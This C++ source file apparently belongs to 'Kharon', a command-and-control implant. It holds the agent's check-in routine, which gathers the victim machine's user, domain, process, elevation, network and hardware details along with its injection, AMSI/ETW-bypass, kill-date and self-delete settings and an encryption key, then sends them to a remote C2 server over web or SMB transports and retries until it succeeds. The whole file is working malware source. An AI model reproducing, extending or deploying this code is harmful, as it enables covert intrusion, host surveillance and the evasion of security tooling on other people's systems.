#include <Kharon.h>

auto DECLFN Transport::Checkin(
    VOID
) -> BOOL {
    PPACKAGE CheckinPkg = Self->Pkg->Checkin();
    PPARSER  CheckinPsr = (PPARSER)hAlloc( sizeof( PARSER ) );
    
    KhDbg( "start checkin routine" );

    PVOID  Data    = nullptr;
    SIZE_T Length  = 0;
    PCHAR  NewUUID = nullptr;
    PCHAR  OldUUID = nullptr;
    ULONG  UUIDsz  = 36;

    //
    // the pattern checkin requirement
    //
    Self->Pkg->Pad( CheckinPkg, UC_PTR( Self->Session.AgentID ), 36 );
    Self->Pkg->Byte( CheckinPkg, Self->Machine.OsArch );
    Self->Pkg->Str( CheckinPkg, Self->Machine.UserName );
    Self->Pkg->Str( CheckinPkg, Self->Machine.CompName );
    Self->Pkg->Str( CheckinPkg, Self->Machine.DomName );
    Self->Pkg->Str( CheckinPkg, Self->Machine.NetBios );
    Self->Pkg->Int32( CheckinPkg, Self->Session.ProcessID );
    Self->Pkg->Str( CheckinPkg, Self->Session.ImagePath );

    //
    // custom agent storage for kharon config
    //

    Self->Pkg->Int32( CheckinPkg, Self->Krnl32.GetACP() );
    Self->Pkg->Int32( CheckinPkg, Self->Krnl32.GetOEMCP() );

    // injection behavior
    Self->Pkg->Int32( CheckinPkg, Self->Config.Injection.TechniqueId );
    Self->Pkg->Wstr( CheckinPkg, Self->Config.Injection.StompModule );
    Self->Pkg->Int32( CheckinPkg, Self->Config.Injection.Allocation );
    Self->Pkg->Int32( CheckinPkg, Self->Config.Injection.Writing );

    // some evasion features enable informations
    Self->Pkg->Int32( CheckinPkg, Self->Config.Syscall );
    Self->Pkg->Int32( CheckinPkg, Self->Config.BofHook );
    Self->Pkg->Int32( CheckinPkg, Self->Config.AmsiEtwBypass );

    // killdate informations
    Self->Pkg->Int32( CheckinPkg, Self->Config.KillDate.Enabled );
    Self->Pkg->Int32( CheckinPkg, Self->Config.KillDate.ExitProc );
    Self->Pkg->Int32( CheckinPkg, Self->Config.KillDate.SelfDelete );
    Self->Pkg->Int16( CheckinPkg, Self->Config.KillDate.Year );
    Self->Pkg->Int16( CheckinPkg, Self->Config.KillDate.Month );
    Self->Pkg->Int16( CheckinPkg, Self->Config.KillDate.Day );

    // additional session informations
    Self->Pkg->Str( CheckinPkg, Self->Session.CommandLine );
    Self->Pkg->Int32( CheckinPkg, Self->Session.HeapHandle );
    Self->Pkg->Int32( CheckinPkg, Self->Session.Elevated );
    Self->Pkg->Int32( CheckinPkg, Self->Config.Jitter );
    Self->Pkg->Int32( CheckinPkg, Self->Config.SleepTime );
    Self->Pkg->Int32( CheckinPkg, Self->Session.ParentID );
    Self->Pkg->Int32( CheckinPkg, Self->Session.ProcessArch );
    Self->Pkg->Int64( CheckinPkg, Self->Session.Base.Start );
    Self->Pkg->Int32( CheckinPkg, Self->Session.Base.Length );
    Self->Pkg->Int32( CheckinPkg, Self->Session.ThreadID );  
    
    // mask informations
    Self->Pkg->Int64( CheckinPkg, Self->Config.Mask.JmpGadget );  
    Self->Pkg->Int64( CheckinPkg, Self->Config.Mask.NtContinueGadget );  
    Self->Pkg->Int32( CheckinPkg, Self->Config.Mask.TechniqueID );  

    // process context informations
    Self->Pkg->Int32( CheckinPkg, Self->Config.Ps.ParentID );
    Self->Pkg->Int32( CheckinPkg, Self->Config.Ps.Pipe );
    if ( ! Self->Config.Ps.CurrentDir ) Self->Pkg->Str( CheckinPkg, "" );
    else Self->Pkg->Wstr( CheckinPkg, Self->Config.Ps.CurrentDir );
    Self->Pkg->Int32( CheckinPkg, Self->Config.Ps.BlockDlls );

    // additional machine informations
    Self->Pkg->Str( CheckinPkg, Self->Machine.ProcessorName );
    Self->Pkg->Int32( CheckinPkg, Self->Machine.IpAddress );
    Self->Pkg->Int32( CheckinPkg, Self->Machine.TotalRAM );
    Self->Pkg->Int32( CheckinPkg, Self->Machine.AvalRAM );
    Self->Pkg->Int32( CheckinPkg, Self->Machine.UsedRAM );
    Self->Pkg->Int32( CheckinPkg, Self->Machine.PercentRAM );
    Self->Pkg->Int32( CheckinPkg, Self->Machine.ProcessorsNbr );

    // encryption key
    Self->Pkg->Bytes( CheckinPkg, Self->Crp->LokKey, sizeof( Self->Crp->LokKey ) );

    //
    // send the packet
    //
    while ( ! Self->Pkg->Transmit( CheckinPkg, &Data, &Length ) ) {
        Self->Mk->Main( Self->Config.SleepTime );
    }

    KhDbg( "transmited return %p [%d bytes]", Data, Length );

    //
    // parse response
    //
    Self->Psr->New( CheckinPsr, Data, Length );
    if ( !CheckinPsr->Original ) return FALSE;

    //
    // parse old uuid and new uuid
    //
    OldUUID = (PCHAR)Self->Psr->Pad( CheckinPsr, 36 );
    NewUUID = (PCHAR)Self->Psr->Pad( CheckinPsr, 36 );

    KhDbg( "old uuid: %s", OldUUID );
    KhDbg( "new uuid: %s", NewUUID );

    Self->Session.AgentID = A_PTR( hAlloc( UUIDsz ) );
    Mem::Copy( Self->Session.AgentID, NewUUID, UUIDsz );

    //
    // validate checkin response
    //
    if ( ( NewUUID && Str::CompareA( NewUUID, Self->Session.AgentID ) != 0 ) ) {
        Self->Session.Connected = TRUE;
    } else {

    }

    KhDbg( "set uuid: %s", Self->Session.AgentID );

    Self->Session.Connected = TRUE;

    KhDbg( "checkin routine done..." );

    return Self->Session.Connected;
}

auto Transport::Send(
    _In_      PVOID   Data,
    _In_      UINT64  Size,
    _Out_opt_ PVOID  *RecvData,
    _Out_opt_ UINT64 *RecvSize
) -> BOOL {
#if PROFILE_C2 == PROFILE_WEB
    return Self->Tsp->WebSend(
        Data, Size, RecvData, RecvSize
    );
#endif
#if PROFILE_C2 == PROFILE_SMB
    return Self->Tsp->SmbSend(
        Data, Size, RecvData, RecvSize
    );
#endif
}